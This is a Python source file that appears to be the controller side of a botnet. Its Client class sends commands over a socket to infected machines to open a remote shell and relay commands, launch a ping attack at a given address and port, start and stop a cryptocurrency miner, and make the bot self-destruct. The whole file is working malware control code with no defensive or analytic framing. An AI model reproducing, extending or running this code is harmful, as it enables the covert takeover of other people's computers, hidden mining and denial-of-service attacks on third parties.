import time, socket

class Client:

    def __init__(self, conn, addr, server):
        self.conn = conn
        self.client_addr = addr
        self.server = server
        
    #all of these function names are pretty self explanatory
    def request_info(self):
        command = 'cliget'
        self.conn.send(command.encode('utf-8'))
        self.conn.recv(1024)


    def start_shell(self):
            command = 'shell'
            self.conn.send(command.encode('utf-8'))
            return True


    def send_shell_command(self, command):
        command = command
        self.conn.send(command.encode('utf-8'))
        return True
    
    def recieve_shell_response(self):
        recieved = self.conn.recv(1024).decode('utf-8')
        return recieved
    
    def stop_shell(self):
        command = 'stop'
        self.conn.send(command.encode('utf-8'))
            
                       
    def start_ping(self, addr, port):
        command = 'ping'
        self.conn.send(command.encode('utf-8'))
        time.sleep(2)
        self.conn.send(addr.encode('utf-8'))
        time.sleep(2)
        self.conn.send(str(port).encode('utf-8'))
        
    def stop_ping(self):
        self.conn.send('noping'.encode('utf-8'))
        
    def start_mine(self):
        command = 'startmine'
        self.conn.send(command.encode('utf-8'))
        self.conn.recv(1024)

    def stop_mine(self):
        command = 'stopmine'
        self.conn.send(command.encode('utf-8'))
        self.conn.recv(1024)
        
    def checkup(self):
        command = 'aojshfbgiashf'
        self.conn.send(command.encode('utf-8'))
        
    def destroy(self):
        command = 'selfdestruct'
        self.conn.send(command.encode('utf-8'))
        self.conn.recv(1024)

    
